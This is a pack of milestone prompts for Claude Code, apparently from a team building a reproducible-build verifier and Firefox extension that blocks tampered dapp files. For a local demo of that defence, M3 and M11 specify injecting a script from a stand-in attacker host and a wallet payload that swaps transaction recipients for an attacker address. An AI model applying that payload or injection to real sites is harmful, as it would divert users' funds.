# Claude Code prompt pack

One prompt per milestone, numbered like `docs/build-plan.md`. Paste the prompt for your current milestone into a **fresh** Claude Code session in the repo root.

## Token-saving rules (read once)

1. **One milestone = one session.** Run `/clear` before starting the next prompt. Long sessions re-send their whole history every turn.
2. **The prompt tells Claude what to read.** Every prompt lists the exact docs sections and files. Don't add "look around the repo".
3. **Specs live in `docs/`, not in chat.** If you're tempted to explain the design in chat, the doc is missing something. Fix the doc, then paste the prompt.
4. **Contracts are pre-decided.** `docs/formats.md` holds every type and function signature, so Claude doesn't spend tokens designing them.
5. **No re-research.** SDK facts (Arkiv, Swarm, Firefox `filterResponseData`) are already in the docs. If something truly isn't covered, ask a teammate before letting Claude web-search.
6. **Short answers.** CLAUDE.md asks for an 8-line summary and no pasted files. If Claude starts printing whole files, say "summary only".
7. **Heavy commands once.** The Lido build takes minutes. Build once, keep `out/`, and don't let Claude rebuild in a loop. Use `--check` only when testing determinism.
8. **Stuck for more than 2 attempts?** Stop, `/clear`, and use the **Debug** prompt at the bottom with the exact error. Don't let a session spiral.
9. **Pick the model per task.** Use the strongest model for M1, M5 and M9 (security-critical logic). A faster, cheaper model is fine for UI, demo scripts and docs (M3, M7, M10, M13). Switch with `/model`.

---

## M0 — Repo scaffold (Arya)

```
Read CLAUDE.md and docs/architecture.md (Repo layout section only).
Create the pnpm workspace exactly as in the layout: packages/core, packages/registry, apps/cli, apps/extension, plus empty action/, recipes/, demo/, study/ folders.
- Root: package.json (private, "packageManager": "pnpm@10"), pnpm-workspace.yaml, tsconfig.base.json (strict, ES2022, moduleResolution bundler), .gitignore (node_modules, dist, out, .env*), LICENSE (MIT).
- Each package: package.json named @unforged/core, @unforged/registry, @unforged/cli, @unforged/extension; tsconfig.json extending the base; src/index.ts exporting nothing yet; one vitest test that passes. registry also gets a second export path "./swarm" (src/swarm.ts) for Node-only code.
- apps/extension builds with Vite into dist/ (background.ts, popup.html, blocked.html as entries; copy manifest.json).
- Add root scripts: test, build.
Done when `pnpm i && pnpm -r test && pnpm -r build` pass. Commit "Scaffold workspace".
```

## M1 — Core formats and crypto (Arya, strongest model)

```
Read CLAUDE.md and docs/formats.md (all of it). Work only in packages/core.
1. Create src/types.ts with exactly the types in formats.md: Recipe, Manifest, ConfigRule, Statement, SignedAttestation, Policy, Verdict, Blocked, AcceptedRelease, TabState, SnapshotSummary.
2. Implement the Core API from formats.md §7 in small files (canonical.ts, hash.ts, attestation.ts, policy.ts, config.ts). Use crypto.subtle for sha256 and viem's recoverMessageAddress for signature recovery. No Node built-ins.
3. acceptReleases follows the comment in §7 exactly: drop any entry that fails a check, group the rest by manifestRoot, accept a root with >= threshold distinct builders, keep the newest acceptLatest by builtAt.
4. Tests first (vitest): canonicalJSON key order + nested objects; sha256 of "abc" = ba7816bf...; sign a statement digest with a viem generated private key and verify; reject when creator != signer; 2-of-3 accepted, 1-of-3 rejected, a non-allowlisted builder ignored; an entry whose manifest doesn't hash to the signed root is dropped; acceptLatest=1 keeps only the newest; checkFile ok / unknown-file / hash-mismatch; checkConfig accepts a valid window.__env__ file, rejects an extra key, a non-allowlisted URL host, and a function or object value.
Done when tests and build pass. Commit in 2–3 steps. After this, types.ts is frozen.
```

## M2 — CLI build and manifest (Varun)

```
Read CLAUDE.md, docs/cli-registry.md (CLI section), docs/formats.md §1, §2, §5. Use packages/core exports only via its index.
Implement apps/cli with commander: `unforged build <recipe> [--check]`.
- Parse the YAML recipe (yaml + zod against the Recipe type).
- Shallow clone repo at commit (git) into recipe.buildPath (refuse if it exists and isn't empty), write `files`, write `env` to recipe.envFile as KEY=value lines, refuse if `node --version` major != recipe.node unless --allow-node-mismatch.
- Run install then build via child_process with inherited env + recipe env. Stream output to a log file, not the console.
- Hash every file under `output`; config files listed in recipe.configFiles go to manifest.config, not files. Write manifest.json; print manifestRoot.
- --check: delete recipe.buildPath, clone, install and build again at the same path, compare manifestRoots, exit 3 on mismatch and print the first 10 differing paths.
Also create recipes/lido-staking-widget@0.161.0.yaml from the example column in docs/formats.md §1 (commit e256fd6db9f713433b5b95bcf2d2fd833131a547, node 24, yarn@4.17.1, install `yarn install --immutable`, build `yarn build:ipfs`, output `out`, envFile `.env.production.local`, buildPath `/unforged/build`, files: build-info.json with version/branch/commit, configFiles: /runtime/window-env.js kind window-env-json). Env values: copy the keys from the repo's .env.example; fill RPC URLs with the public testnet endpoints Yuvraaj picked, and mark anything unknown TODO. Note: the build fails with "Invariant failed" during prerender unless every supported chain has an RPC URL. Every builder must use the same env values: Lido prerenders the origin values (ROOT_ORIGIN, DOCS_ORIGIN, HELP_ORIGIN, SELF_ORIGIN) into its HTML pages, while RPC URLs and the WalletConnect ID only reach runtime/window-env.js.
Done when the Lido recipe builds and `--check` passes (170 output files: 169 in manifest.files, /runtime/window-env.js in manifest.config). Commit.
```

## M3 — Demo server and attack modes (Yuvraaj, faster model)

```
Read CLAUDE.md and docs/demo.md (Setup and modes only). Work only in demo/.
Create demo/server.mjs (Node http, no framework) serving demo/site on http://localhost:8080 and demo/attacker.mjs serving demo/attacker/evil.js on http://localhost:9090. server.mjs reads demo/state.json on every request:
- reset: serve demo/site as-is
- swap: for the path in state.target, serve demo/tampered/<same path> instead
- inject: for "/" and "/index.html", insert `<script src="http://localhost:9090/evil.js"></script>` before </head>
- hijack: serve everything from demo/clone/
Create demo/attack.mjs <reset|swap|inject|hijack> [--target <path>] that writes state.json. Correct Content-Type for html/js/css/json/svg/png. Send `Cache-Control: no-store`.
Until the Lido build exists, use a tiny 2-file site in demo/site to test.
Done when curl shows each mode's effect. Commit.
```

## M4 — Extension: intercept and hash (Arya)

```
Read CLAUDE.md and docs/extension.md (Manifest essentials, Background: enforcement). Work only in apps/extension.
- manifest.json per "Manifest essentials".
- background.ts: for requests where the tab's top-level origin is in a hardcoded list ["http://localhost:8080"], attach browser.webRequest.filterResponseData for the resource types listed in the enforcement table. Buffer all ondata chunks, and in onstop concatenate, sha256 with core.sha256Hex, console.log({url, type, sha256}), then write the full body and close.
- Track per-tab state in memory; reset on main_frame navigation.
Done when, in Firefox with the demo server, every script on localhost:8080 is logged with its hash and the page still works. Commit.
```

## M5 — Extension: verify and block (Arya, strongest model)

```
Read CLAUDE.md, docs/extension.md (Background: enforcement, Acceptance tests 1–4) and docs/formats.md §5–§7. Use core.checkFile, core.checkConfig. Work only in apps/extension/src/background*.
- Load a snapshot from fixtures/snapshot.json (shape from extension.md Background: sync step 5). Build it from the Lido manifest.json produced in M2.
- Implement the release lock, the per-request decision table, config-file checks, third-party rule, and the block behaviour (empty body for scripts/styles; tabs.update to blocked.html for documents). Update TabState and the badge (browser.action.setBadgeText/BackgroundColor).
- Keep the first 200 KB of each blocked script body in memory. Answer getTabState, getSnapshotSummary and getBlockedBody from the messages table in extension.md (openVerifiedCopy comes in M9).
- Fail closed on any error inside a filter.
Done when acceptance tests 1–4 pass manually (use demo/attack.mjs). Add unit tests for the pure decision function. Commit in steps.
```

## M6 — Attest and Arkiv (Varun)

```
First run: npx skills add https://github.com/arkiv-network/skills
Read CLAUDE.md, docs/cli-registry.md (CLI, Registry package) and docs/formats.md §3–§4. Work in packages/registry and apps/cli.
- packages/registry/src/arkiv.ts: publishAttestation, publishPolicy, fetchPolicies, fetchAttestations exactly as specified (fetchAttestations returns swarmRef from the swarm_ref attribute and skips payload downloads for keys in skipKeys). Browser-safe: no Node imports in this file. Gzip payloads (fflate). Readonly entities, ExpirationTime.fromDays(365), attributes from formats.md §4. Reads always use .createdBy(). Paginate.
- apps/cli: `attest` (sign the statement digest with BUILDER_PRIVATE_KEY via viem privateKeyToAccount + signMessage({message:{raw}})), `publish` (idempotent by manifest_root), `policy` (curator, version = previous + 1).
- Tests: payload round-trip (gzip + decode); a mocked client for fetch pagination. Do not hit the network in unit tests.
Then live: publish the Lido attestation from 3 builder keys and one policy from the curator key (threshold 2, acceptLatest 3, origins ["http://localhost:8080"], thirdParty {}, recovery.gateway = the Swarm gateway base). Print explorer links.
Done when fetchAttestations returns 3 verified attestations with the same manifest_root. Commit.
```

## M7 — Extension UI shell (Yuvraaj, faster model)

```
Read CLAUDE.md, docs/extension.md (the messages table and the UI section) and the TabState/Verdict/SnapshotSummary types in packages/core/src/types.ts. Work only in apps/extension/src/ui*, popup.html, blocked.html.
Build the popup and blocked page in plain TS + CSS (no framework). They get state only through the messages table in extension.md. Create a mock mode (?mock=reproduced|vendor|mismatch|unsupported) so the UI can be built before M5 exists.
Popup: dapp, release, short commit, builders (k of n), files checked, accepted config values, last sync. Blocked page: header, list of blocked files with reasons, empty diff container, buttons "Open verified copy" and "Go back". Calm wording from the doc.
Done when all verdict levels render in mock mode. Commit.
```

## M8 — Swarm (Varun)

```
Read CLAUDE.md and docs/cli-registry.md (Registry package: Swarm lines). Work in packages/registry and apps/cli.
Implement uploadDir in src/swarm.ts (exported as @unforged/registry/swarm, Node only) with @ethersphere/bee-js, and gatewayUrl in the browser-safe entry. Add `--out-dir` to `unforged publish`: upload first, then put the ref in the swarm_ref attribute. BEE_URL and POSTAGE_BATCH_ID come from env.
Done when the Lido out/ is uploaded, gatewayUrl(gateway, ref, "/index.html") opens in a browser, and a re-published attestation carries the ref. Commit.
```

## M9 — Sync and recovery (Arya, strongest model)

```
Read CLAUDE.md, docs/extension.md (Background: sync, Recovery origin) and packages/registry/src/index.ts (exports only). Work in apps/extension/src/background*.
- Replace the fixture with real sync: alarms every 10 min + on install; fetchPolicies(CURATOR_ADDRESS) → fetchAttestations per builder, passing the cached entity keys as skipKeys → acceptReleases (it verifies) → storage.local snapshot. Clear the cache for policy origins when the snapshot changes.
- Recovery: treat requests under policy.recovery.gateway + swarmRef as files of that release (path after the ref) and verify them the same way. Implement the "openVerifiedCopy" message the blocked page sends.
Done when a fresh Firefox profile reaches 🟢 with no fixture, and acceptance tests 5 and 6 pass. Commit.
```

## M10 — Diff panel (Yuvraaj)

```
Read CLAUDE.md and docs/extension.md (the messages table and the UI: Diff panel row). Work only in apps/extension/src/ui*.
For the first blocked script in TabState: get its body with {type:"getBlockedBody", tabId, url}; fetch the verified file via gatewayUrl(gateway, swarmRef, path) using getSnapshotSummary; check its sha256 against the manifest with core.sha256Hex (refuse to show it on mismatch); pretty-print both with js-beautify, and render createTwoFilesPatch from `diff` as a coloured unified diff, capped at 400 lines.
Done when the swap attack shows a readable diff with the injected lines highlighted. Commit.
```

## M11 — Payload and wallet flow (Yuvraaj)

```
Read CLAUDE.md and docs/demo.md (payload and demo script). Work only in demo/.
Write demo/attacker/payload.js: wraps window.ethereum.request; for eth_sendTransaction replaces params[0].to with ATTACKER_ADDRESS (from demo/config.json). Create:
- demo/tampered/<target chunk>: the genuine chunk + payload appended (script tools/make-tampered.mjs <path>)
- demo/clone/: a copy of demo/site with the same payload in the main bundle (script tools/make-clone.mjs)
- demo/attacker/evil.js = payload.js
Pick the target chunk: the JS file that loads on the stake page (find it from the browser network tab, not by reading the bundle).
Done when, with the extension disabled, clicking Stake on the testnet shows the attacker address in the wallet prompt, for swap, inject and hijack. Commit.
```

## M12 — GitHub Action (Varun)

```
Read CLAUDE.md and docs/cli-registry.md (GitHub Action section). Work only in action/ and .github/workflows/example-builder.yml.
Composite action.yml: inputs recipe, bee-url, postage-batch, arkiv-rpc (optional); uses actions/setup-node with the recipe's node version, installs the CLI from this repo, runs build → attest → publish with BUILDER_PRIVATE_KEY from secrets. Outputs manifest-root, entity-key, swarm-ref. Add an example workflow (workflow_dispatch) and an "Independent builders" README section.
Done when a run in a second GitHub org publishes a valid attestation the extension accepts. Commit.
```

## M13 — Sponsor docs (Yuvraaj, faster model)

```
Read docs/build-plan.md (M13 row), docs/formats.md §4 and the real values in demo/config.json and the M6/M8 outputs the team gives you (wallet addresses, entity keys, swarm ref). Write:
- README.md: what it is (3 sentences), demo GIF placeholder, quick start (CLI + extension), architecture diagram (copy from docs/architecture.md), "How it compares" (WEBCAT, Code Verify), and these sections:
  - "CROPS": one or two lines each for C (what we control and what happens if it disappears), O (license, build from repo alone), P (no per-visit lookups, no trackers), S (keys, trust assumptions, what we don't catch)
  - "Arkiv": writing wallet addresses, one copy-pasteable query, link to /arkiv/schema.md
  - "Swarm": how it's used + one openable reference
  - "AI use": Claude Code wrote most code from team-written specs; list which parts
- arkiv/schema.md from formats.md §4. arkiv/friction.md as a template with the friction notes the team collected (ask for them).
Done when every sponsor requirement in docs/build-plan.md M13 is present. Commit.
```

## M14 — ENS policy (optional, Varun)

```
Read CLAUDE.md and docs/architecture.md (Sponsor integration: ENSv2). Mirror a dapp's policy in ENSv2 text records on Sepolia under our name: unforged.repo, unforged.builders, unforged.threshold, and contenthash = bzz://<swarm ref>. Using Enhanced Access Control, grant a second account a setter role scoped to the unforged.builders key only, and show that it can't set unforged.repo. Add a read path in packages/registry (fetchEnsPolicy). Do not change the extension unless Arya agrees.
Done when the delegated-key test passes on Sepolia. Commit.
```

## M15 — Chrome detect mode (optional, Arya)

```
Read CLAUDE.md and docs/extension.md (Chrome section). Separate build target apps/extension/chrome/. Content script: list script URLs, re-fetch from the page context, hash, compare. MAIN-world script at document_start: wrap window.ethereum.request and EIP-6963 providers, hold eth_sendTransaction / eth_signTypedData* until the verdict is green, reject on red. README note on the WebHID/WebUSB gap.
Done when the swap attack on Chrome shows a red warning and the wallet request is held. Commit.
```

---

## Debug prompt (any time, fresh session)

```
Read CLAUDE.md. Problem in <package>: <one-line symptom>.
Exact error:
<paste the error and the command that produced it>
Relevant files: <at most 3 paths>.
Find the cause, fix it minimally, run that package's tests, and summarise in 5 lines. Don't refactor anything else.
```

## Review prompt (before each merge to main)

```
Read CLAUDE.md and docs/formats.md. Review the diff of the last <n> commits (git diff HEAD~<n>) for: violations of the hard rules, fail-open paths in verification, key handling, and any change to packages/core/src/types.ts. List findings with file:line, most severe first. No fixes, findings only.
```
